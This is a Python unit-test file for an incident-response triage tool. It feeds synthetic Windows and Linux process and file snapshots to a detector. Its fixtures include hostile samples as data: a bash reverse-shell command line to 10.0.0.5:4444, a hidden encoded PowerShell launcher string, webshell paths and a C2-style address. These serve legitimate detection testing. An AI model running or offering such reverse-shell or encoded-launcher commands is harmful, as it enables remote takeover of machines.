import unittest
import json
import os
from bluekit.resp.triage import analyze

class TestTriageDeep(unittest.TestCase):
    def setUp(self):
        with open('tests/fixtures/real_win11_benign.json', 'r', encoding='utf-8') as f:
            self.win_snap = json.load(f)
            
        with open('tests/fixtures/linux_collector_format.json', 'r', encoding='utf-8') as f:
            self.lin_snap = json.load(f)
            
    def test_benign_processes_quiet(self):
        snap = dict(self.win_snap)
        snap['processes'] = [
            {'pid': 1, 'ppid': 100, 'name': 'svchost.exe', 'path': 'C:\\Windows\\System32\\svchost.exe', 'cmdline': 'svchost.exe -k netsvcs -p', 'signed': 'valid'},
            {'pid': 100, 'ppid': 0, 'name': 'services.exe', 'path': 'C:\\Windows\\System32\\services.exe', 'signed': 'valid'},
            {'pid': 2, 'name': 'explorer.exe', 'path': 'C:\\Windows\\explorer.exe', 'signed': 'valid'},
            {'pid': 3, 'name': 'chrome.exe', 'path': 'C:\\Program Files\\Google\\Chrome\\chrome.exe', 'signed': 'valid'},
            {'pid': 4, 'name': 'Teams.exe', 'path': 'C:\\Users\\u\\AppData\\Local\\Microsoft\\Teams\\Teams.exe', 'signed': 'valid'},
            {'pid': 5, 'ppid': 2, 'name': 'powershell.exe', 'path': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'cmdline': 'powershell.exe', 'signed': 'valid'},
            {'pid': 6, 'name': 'Update.exe', 'path': 'C:\\Users\\u\\AppData\\Local\\Discord\\Update.exe', 'signed': 'valid'}
        ]
        
        findings, _ = analyze(None, snap)
        proc_findings = [f for f in findings if f['category'] == 'process']
        self.assertEqual(len(proc_findings), 0)
        
    def test_masquerade_svchost(self):
        snap = dict(self.win_snap)
        snap['processes'] = [
            {'pid': 10, 'name': 'svchost.exe', 'path': 'C:\\Users\\Public\\svchost.exe', 'cmdline': 'svchost.exe -k', 'signed': 'unsigned'}
        ]
        findings, _ = analyze(None, snap)
        proc_findings = [f for f in findings if f['category'] == 'process']
        self.assertEqual(len(proc_findings), 1)
        self.assertEqual(proc_findings[0]['confidence'], 'high')
        self.assertIn('svchost.exe', proc_findings[0]['item'])
        
    def test_office_spawns_shell(self):
        snap = dict(self.win_snap)
        snap['processes'] = [
            {'pid': 100, 'name': 'winword.exe', 'path': 'C:\\Program Files\\Microsoft Office\\winword.exe', 'signed': 'valid'},
            {'pid': 101, 'ppid': 100, 'name': 'cmd.exe', 'path': 'C:\\Windows\\System32\\cmd.exe', 'signed': 'valid'}
        ]
        findings, _ = analyze(None, snap)
        proc_findings = [f for f in findings if f['category'] == 'process']
        self.assertEqual(len(proc_findings), 1)
        self.assertEqual(proc_findings[0]['confidence'], 'high')
        self.assertTrue(any('winword' in r for r in proc_findings[0]['reasons']))
        
    def test_temp_unsigned_with_c2(self):
        snap = dict(self.win_snap)
        snap['processes'] = [
            {'pid': 900, 'name': 'updater.exe', 'path': 'C:\\Users\\u\\AppData\\Local\\Temp\\updater.exe', 'signed': 'unsigned'}
        ]
        snap['connections'] = [
            {'pid': 900, 'raddr': '185.215.113.66', 'rport': 443}
        ]
        findings, _ = analyze(None, snap)
        proc_findings = [f for f in findings if f['category'] == 'process']
        self.assertEqual(len(proc_findings), 1)
        self.assertEqual(proc_findings[0]['confidence'], 'high')
        rs = proc_findings[0]['reasons']
        self.assertTrue(any('joylashuv' in r for r in rs))
        self.assertTrue(any('ulangan' in r for r in rs))
        
        snap['processes'][0]['signed'] = 'valid'
        findings2, _ = analyze(None, snap)
        proc_findings2 = [f for f in findings2 if f['category'] == 'process']
        self.assertEqual(len(proc_findings2), 0)
        
    def test_process_order_independent(self):
        snap = dict(self.win_snap)
        procs = [
            {'pid': 101, 'ppid': 100, 'name': 'cmd.exe', 'path': 'C:\\Windows\\System32\\cmd.exe', 'signed': 'valid'},
            {'pid': 100, 'name': 'winword.exe', 'path': 'C:\\Program Files\\Microsoft Office\\winword.exe', 'signed': 'valid'}
        ]
        snap['processes'] = procs
        findings, _ = analyze(None, snap)
        proc_findings = [f for f in findings if f['category'] == 'process']
        self.assertEqual(len(proc_findings), 1)
        self.assertEqual(proc_findings[0]['confidence'], 'high')
        
    def test_baseline_suppresses_p4_not_p1(self):
        snap = dict(self.win_snap)
        snap['processes'] = [
            {'pid': 900, 'name': 'updater.exe', 'path': 'C:\\Users\\u\\AppData\\Local\\Temp\\updater.exe', 'signed': 'unsigned'},
            {'pid': 10, 'name': 'svchost.exe', 'path': 'C:\\Users\\Public\\svchost.exe', 'cmdline': 'svchost.exe -k', 'signed': 'unsigned'}
        ]
        base = {'processes': [{'name': 'updater.exe', 'path': 'C:\\Users\\u\\AppData\\Local\\Temp\\updater.exe'}, {'name': 'svchost.exe', 'path': 'C:\\Users\\Public\\svchost.exe'}]}
        findings, _ = analyze(None, snap, baseline=base)
        proc_findings = [f for f in findings if f['category'] == 'process']
        self.assertEqual(len(proc_findings), 1)
        self.assertIn('svchost.exe', proc_findings[0]['item'])
        
    def test_file_rules(self):
        snap = dict(self.win_snap)
        snap['suspicious_files'] = [
            {'path': 'C:\\Users\\u\\AppData\\Local\\Temp\\a.txt', 'exe_magic': True, 'ext': '.txt'},
            {'path': 'C:\\Users\\u\\Downloads\\invoice.pdf.exe', 'ext': '.exe'},
            {'path': 'C:\\Users\\u\\AppData\\Local\\Temp\\x.bat', 'ext': '.bat', 'head': 'powershell -nop -w hidden -enc SQBFAFgA'},
            {'path': 'C:\\inetpub\\wwwroot\\s.aspx', 'ext': '.aspx', 'webshell_hint': True},
            {'path': 'C:\\Windows\\System32\\evil.dll', 'ext': '.dll', 'signed': 'unsigned'},
            {'path': 'C:\\Users\\u\\AppData\\Local\\Temp\\readme.txt', 'ext': '.txt', 'exe_magic': False},
            {'path': 'C:\\Users\\u\\AppData\\Local\\Temp\\setup.exe', 'ext': '.exe', 'signed': 'valid'}
        ]
        findings, _ = analyze(None, snap)
        file_findings = [f for f in findings if f['category'] == 'file']
        self.assertEqual(len(file_findings), 5)
        for f in file_findings:
            self.assertEqual(f['confidence'], 'high')
            
    def test_linux_processes(self):
        snap = dict(self.lin_snap)
        snap['processes'] = [
            {'pid': 1, 'name': 'malware', 'path': '/opt/malware', 'exe_deleted': True},
            {'pid': 2, 'name': 'miner', 'path': '/tmp/.x/miner'},
            {'pid': 3, 'name': 'apache2', 'path': '/usr/sbin/apache2'},
            {'pid': 4, 'ppid': 3, 'name': 'sh', 'path': '/bin/sh'},
            {'pid': 5, 'name': 'sshd', 'path': '/usr/sbin/sshd'},
            {'pid': 6, 'name': 'bash', 'cmdline': 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'}
        ]
        findings, _ = analyze(None, snap)
        proc_findings = [f for f in findings if f['category'] == 'process']
        self.assertEqual(len(proc_findings), 4)
        for f in proc_findings:
            self.assertEqual(f['confidence'], 'high')
            
    def test_linux_files(self):
        snap = dict(self.lin_snap)
        snap['suspicious_files'] = [
            {'path': '/tmp/.k/agent', 'exe_magic': True, 'hidden': True, 'ext': ''},
            {'path': '/var/www/html/up.php', 'ext': '.php', 'webshell_hint': True},
            {'path': '/usr/local/bin/tool', 'exe_magic': True, 'ext': ''},
            {'path': '/tmp/notes.sh', 'head': 'echo hi', 'ext': '.sh'}
        ]
        findings, _ = analyze(None, snap)
        file_findings = [f for f in findings if f['category'] == 'file']
        self.assertEqual(len(file_findings), 3)
        
    def test_missing_sections_ok(self):
        snap = dict(self.win_snap)
        if 'processes' in snap: del snap['processes']
        if 'suspicious_files' in snap: del snap['suspicious_files']
        findings, _ = analyze(None, snap)
        proc_file_findings = [f for f in findings if f['category'] in ['process', 'file']]
        self.assertEqual(len(proc_file_findings), 0)
        
    def test_remediate_process_file(self):
        from bluekit.resp.remediate import generate
        f_win = {'category': 'process', 'item': 'svchost.exe (pid 10) C:\\Users\\Public\\svchost.exe', 'pid': 10, 'path': 'C:\\Users\\Public\\svchost.exe'}
        gen_win = generate(f_win, 'windows', full=True)
        self.assertIn('Stop-Process -Id', gen_win)
        self.assertIn('Copy-Item -LiteralPath', gen_win)
        self.assertIn('C:\\ir\\backup', gen_win)
        
        f_lin = {'category': 'process', 'item': 'malware (pid 1) /opt/malware', 'pid': 1, 'path': '/opt/malware'}
        gen_lin = generate(f_lin, 'linux', full=True)
        self.assertIn('kill -9', gen_lin)
        self.assertIn('/proc/', gen_lin)
        self.assertIn('chmod -x', gen_lin)
        
        f_win_nop = {'category': 'process', 'item': 'sys (pid 4) ', 'pid': 4, 'path': ''}
        gen_win_nop = generate(f_win_nop, 'windows', full=True)
        self.assertIn('REMOVE manually', gen_win_nop)
        self.assertNotIn("Remove-Item -LiteralPath ''", gen_win_nop)

if __name__ == '__main__':
    unittest.main()
